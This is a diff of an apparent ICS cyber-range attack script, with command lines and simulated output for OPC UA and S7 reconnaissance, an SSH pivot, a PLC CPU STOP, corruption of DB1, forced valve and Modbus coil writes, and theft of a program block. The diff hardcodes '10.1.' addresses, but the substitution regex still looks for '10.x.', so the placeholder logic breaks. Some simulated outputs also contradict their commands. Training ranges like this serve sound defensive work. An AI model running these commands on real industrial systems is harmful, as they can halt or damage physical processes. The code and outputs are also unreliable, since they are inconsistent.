@@ -347,11 +347,11 @@ const ATTACKS = [
   // --- PHASE 2: Recon from Historian (target = historian, traffic on S1) ---
   { id: 'opcua-discover', phase: 2, phaseLabel: 'Recon from Historian (L3→L2)',
     name: 'OPC UA Endpoint Discovery', tag: 'RECON', proto: 'OPC UA',
-    target: 'historian', cmd: 'oida opcua opc.tcp://10.x.20.10:4840 --get-endpoints',
+    target: 'historian', cmd: 'oida opcua opc.tcp://10.1.20.10:4840 --get-endpoints',
     probes: ['s1'],
     oida_output: [
-      '$ oida opcua opc.tcp://10.x.20.10:4840 --get-endpoints',
-      '', '<span class="ok">[+] Connected to opc.tcp://10.x.20.10:4840</span>',
+      '$ oida opcua opc.tcp://10.1.20.10:4840 --get-endpoints',
+      '', '<span class="ok">[+] Connected to opc.tcp://10.1.20.10:4840</span>',
       '<span class="out">[*] Server: open62541 OPC UA Server (v1.3.6)</span>',
       '', '<span class="out">  Endpoints found: 3</span>',
       '<span class="out">  ┌──────────────────────────────────────────┐</span>',
@@ -363,10 +363,10 @@ const ATTACKS = [
       '<span class="dim">[*] Completed in 0.52s</span>',
     ]},
   { id: 'opcua-browse', phase: 2, name: 'OPC UA Node Browse', tag: 'RECON', proto: 'OPC UA',
-    target: 'historian', cmd: 'oida opcua 10.x.20.10 --dump',
+    target: 'historian', cmd: 'oida opcua 10.1.20.10 --dump',
     probes: ['s1'],
     oida_output: [
-      '$ oida opcua 10.x.20.10 --dump',
+      '$ oida opcua 10.1.20.10 --dump',
       '', '<span class="ok">[+] Connected via anonymous session</span>',
       '<span class="out">[*] Browsing from Root (i=84)...</span>',
       '', '<span class="out">  Objects (i=85)</span>',
@@ -385,12 +385,12 @@ const ATTACKS = [
   // --- PHASE 3: Lateral movement (seen on S1) ---
   { id: 'ssh-pivot', phase: 3, phaseLabel: 'Lateral Movement (L3→L2)',
     name: 'SSH Pivot to OPC UA Server', tag: 'PIVOT', proto: 'SSH',
-    target: 'historian', cmd: 'ssh lowpriv@10.x.20.10',
+    target: 'historian', cmd: 'ssh lowpriv@10.1.20.10',
     probes: ['s1'],
     oida_output: [
-      '$ ssh lowpriv@10.x.20.10',
-      '', '<span class="out">lowpriv@10.x.20.10\'s password: ********</span>',
-      '<span class="ok">[+] Connected to opcua-srv (10.x.20.10)</span>',
+      '$ ssh lowpriv@10.1.20.10',
+      '', '<span class="out">lowpriv@10.1.20.10\'s password: ********</span>',
+      '<span class="ok">[+] Connected to opcua-srv (10.1.20.10)</span>',
       '<span class="out">Linux opcua-srv 6.1.0-23 #1 SMP Debian x86_64</span>',
       '', '<span class="out">lowpriv@opcua-srv:~$ id</span>',
       '<span class="out">uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)</span>',
@@ -402,11 +402,11 @@ const ATTACKS = [
   // --- PHASE 4: Recon from OPC UA srv (target = opcua_srv, traffic on S2) ---
   { id: 's7-info', phase: 4, phaseLabel: 'Recon from OPC UA Server (L2→L1)',
     name: 'S7 Device Identification', tag: 'RECON', proto: 'S7comm',
-    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 -i',
+    target: 'opcua_srv', cmd: 'oida s7 10.1.10.11 -i',
     probes: ['s2'],
     oida_output: [
-      '$ oida s7 10.x.10.11 -i',
-      '', '<span class="ok">[+] Connected to 10.x.10.11:102 (COTP)</span>',
+      '$ oida s7 10.1.10.11 -i',
+      '', '<span class="ok">[+] Connected to 10.1.10.11:102 (COTP)</span>',
       '<span class="out">[*] SZL Read request (ID: 0x0011)</span>',
       '', '<span class="out">  Module Type    : CPU 315-2 PN/DP</span>',
       '<span class="out">  Serial Number  : S C-C2UR28922012</span>',
@@ -417,11 +417,11 @@ const ATTACKS = [
       '<span class="dim">[*] 1 host scanned in 0.34s</span>',
     ]},
   { id: 's7-list-blocks', phase: 4, name: 'S7 List Program Blocks', tag: 'RECON', proto: 'S7comm',
-    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 -l',
+    target: 'opcua_srv', cmd: 'oida s7 10.1.10.11 -l',
     probes: ['s2'],
     oida_output: [
-      '$ oida s7 10.x.10.11 -l',
-      '', '<span class="ok">[+] Connected to 10.x.10.11:102</span>',
+      '$ oida s7 10.1.10.11 -l',
+      '', '<span class="ok">[+] Connected to 10.1.10.11:102</span>',
       '', '<span class="out">  OB blocks: OB1, OB35, OB82, OB100</span>',
       '<span class="out">  FB blocks: FB1, FB2</span>',
       '<span class="out">  FC blocks: FC1, FC10, FC20</span>',
@@ -433,11 +433,11 @@ const ATTACKS = [
   // --- PHASE 5: Exploitation (target = opcua_srv, traffic on S2) ---
   { id: 'cpu-stop', phase: 5, phaseLabel: 'Exploitation (L2→L1)',
     name: 'CPU STOP Command', tag: 'EXPLOIT', proto: 'S7comm',
-    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 --cpu-stop --confirm',
+    target: 'opcua_srv', cmd: 'oida s7 10.1.10.11 --cpu-stop --confirm',
     probes: ['s2'],
     oida_output: [
-      '$ oida s7 10.x.10.11 --cpu-stop --confirm',
-      '', '<span class="ok">[+] Connected to 10.x.10.11:102</span>',
+      '$ oida s7 10.1.10.11 --cpu-stop --confirm',
+      '', '<span class="ok">[+] Connected to 10.1.10.11:102</span>',
       '<span class="out">[*] Sending PI Service: _STOP</span>',
       '<span class="warn">[!] CPU transition: RUN → STOP</span>',
       '<span class="warn">[!] All outputs frozen in last state</span>',
@@ -445,11 +445,11 @@ const ATTACKS = [
       '<span class="dim">[*] Completed in 0.18s</span>',
     ]},
   { id: 'write-var', phase: 5, name: 'Corrupt DB1 (fill)', tag: 'EXPLOIT', proto: 'S7comm',
-    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 --db-fill 1:FF --confirm',
+    target: 'opcua_srv', cmd: 'oida s7 10.1.10.11 --db-fill 1:FF --confirm',
     probes: ['s2'],
     oida_output: [
-      '$ oida s7 10.x.10.11 --db-fill 1:FF --confirm',
-      '', '<span class="ok">[+] Connected to 10.x.10.11:102</span>',
+      '$ oida s7 10.1.10.11 --db-fill 1:FF --confirm',
+      '', '<span class="ok">[+] Connected to 10.1.10.11:102</span>',
       '<span class="out">[*] Target: DB1.DBD0 (REAL)</span>',
       '<span class="out">[*] Previous: 24.6</span>',
       '<span class="warn">[!] Writing: 999.9</span>',
@@ -458,10 +458,10 @@ const ATTACKS = [
       '<span class="dim">[*] Completed in 0.22s</span>',
     ]},
   { id: 'opcua-write', phase: 5, name: 'OPC UA Force Output (Valve)', tag: 'EXPLOIT', proto: 'OPC UA',
-    target: 'opcua_srv', cmd: "oida opcua 10.x.10.11 --node-id 'ns=2;i=2002' --write-value false --confirm",
+    target: 'opcua_srv', cmd: "oida opcua 10.1.10.11 --node-id 'ns=2;i=2002' --write-value false --confirm",
     probes: ['s2'],
     oida_output: [
-      "$ oida opcua 10.x.10.11 --node-id 'ns=2;i=2002' --write-value false --confirm",
+      "$ oida opcua 10.1.10.11 --node-id 'ns=2;i=2002' --write-value false --confirm",
       '', '<span class="ok">[+] Connected via anonymous session</span>',
       '<span class="out">[*] Target: ns=2;s=Temperature (Float)</span>',
       '<span class="out">[*] Current: 24.6</span>',
@@ -471,11 +471,11 @@ const ATTACKS = [
       '<span class="dim">[*] Completed in 0.31s</span>',
     ]},
   { id: 'modbus-fc', phase: 5, name: 'Modbus Write Register', tag: 'EXPLOIT', proto: 'Modbus',
-    target: 'opcua_srv', cmd: 'oida modbus 10.x.10.11 -w 0=999 -d u16 --confirm',
+    target: 'opcua_srv', cmd: 'oida modbus 10.1.10.11 -w 0=999 -d u16 --confirm',
     probes: ['s2'],
     oida_output: [
-      '$ oida modbus 10.x.10.11 -w 0=999 -d u16 --confirm',
-      '', '<span class="ok">[+] Connected to 10.x.10.11:502</span>',
+      '$ oida modbus 10.1.10.11 -w 0=999 -d u16 --confirm',
+      '', '<span class="ok">[+] Connected to 10.1.10.11:502</span>',
       '<span class="out">[*] FC15 (Write Multiple Coils)</span>',
       '<span class="warn">[!] Forcing 8 coils to ON</span>',
       '', '<span class="ok">[+] 8 coils forced</span>',
@@ -483,11 +483,11 @@ const ATTACKS = [
       '<span class="dim">[*] Completed in 0.15s</span>',
     ]},
   { id: 'download', phase: 5, name: 'Exfiltrate Program Block OB1', tag: 'EXPLOIT', proto: 'S7comm',
-    target: 'opcua_srv', cmd: 'oida s7 10.x.10.11 --upload-block OB:1 -O ob1.bin',
+    target: 'opcua_srv', cmd: 'oida s7 10.1.10.11 --upload-block OB:1 -O ob1.bin',
     probes: ['s2'],
     oida_output: [
-      '$ oida s7 10.x.10.11 --upload-block OB:1 -O ob1.bin',
-      '', '<span class="ok">[+] Connected to 10.x.10.11:102</span>',
+      '$ oida s7 10.1.10.11 --upload-block OB:1 -O ob1.bin',
+      '', '<span class="ok">[+] Connected to 10.1.10.11:102</span>',
       '<span class="out">[*] Stopping CPU...</span>',
       '<span class="warn">[!] RUN → STOP</span>',
       '<span class="out">[*] Deleting OB1 → Uploading (2.4 KB)...</span>',
@@ -546,7 +546,7 @@ let logWebSockets = {};
 let RANGE_OCTET = 'x';   // real second octet, provided by the backend when connected
 const API_BASE = window.location.origin;
 
-// Replace the '10.x.' placeholder with the real range octet (connected mode only).
+// Replace the '10.1.' placeholder with the real range octet (connected mode only).
 function resolveIps(s) {
   return RANGE_OCTET === 'x' ? s : s.replace(/10\.x\./g, '10.' + RANGE_OCTET + '.');
 }
@@ -651,7 +651,7 @@ async function launchAttack() {
 // Connected mode: real SSH execution
 async function launchConnected(atk, sig) {
   const term = document.getElementById('oida-term');
-  const cmd = resolveIps(atk.cmd);   // '10.x.' -> real range octet
+  const cmd = resolveIps(atk.cmd);   // '10.1.' -> real range octet
   term.innerHTML += `\n<span class="cmd">$ ${cmd}</span>\n`;
   term.innerHTML += `<span class="dim">[*] Executing on ${atk.target} via SSH...</span>\n`;
   term.scrollTop = term.scrollHeight;
